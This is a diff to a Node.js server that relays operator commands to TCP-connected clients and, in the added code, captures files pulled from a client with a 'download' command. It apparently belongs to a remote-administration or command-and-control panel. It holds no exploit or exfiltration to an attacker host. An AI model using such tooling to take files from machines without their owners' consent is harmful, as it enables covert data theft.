@@ -202,6 +202,32 @@ function createTcpServer() {
       for (const line of lines) {
         if (line.trim() === '') continue; // Skip empty lines
         
+        // If this looks like non-JSON (e.g., binary/text header), and a download is pending, treat as file bytes
+        const client = clients.get(clientId);
+        if (client && client.pendingDownload && client.pendingDownload.inProgress && (line[0] !== '{' || line.indexOf('"') === -1)) {
+          const pd = client.pendingDownload;
+          const chunk = Buffer.from(line, 'binary');
+          pd.buffer = Buffer.concat([pd.buffer || Buffer.alloc(0), chunk]);
+          if (pd.timeout) clearTimeout(pd.timeout);
+          pd.timeout = setTimeout(() => {
+            try {
+              const filename = path.basename(pd.filename || `download_${Date.now()}`);
+              const downloadPath = path.join('downloads', filename);
+              fs.writeFileSync(downloadPath, pd.buffer || Buffer.alloc(0));
+              console.log(`[TCP] File downloaded (text-split path): ${downloadPath} (${(pd.buffer||Buffer.alloc(0)).length} bytes)`);
+              io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: (pd.buffer||Buffer.alloc(0)).length });
+              io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}`, timestamp: new Date() });
+            } catch (e) {
+              console.error('[TCP] Error saving downloaded file (text-split):', e);
+              io.emit('commandResponse', { clientId, response: `Download save failed: ${e.message}`, timestamp: new Date() });
+            } finally {
+              if (client.pendingDownload && client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
+              client.pendingDownload = null;
+            }
+          }, 500);
+          continue;
+        }
+
         try {
           const raw = JSON.parse(line);
           const message = {
@@ -512,6 +538,15 @@ io.on('connection', (socket) => {
     
     if (client && client.socket && client.active) {
       try {
+        // If user is downloading via terminal, prepare pending download capture
+        if (typeof command === 'string' && command.trim().toLowerCase().startsWith('download ')) {
+          client.pendingDownload = {
+            inProgress: true,
+            filename: command.trim().slice('download '.length),
+            buffer: Buffer.alloc(0),
+            timeout: null
+          };
+        }
         const commandData = {
           type: 'command',
           content: command
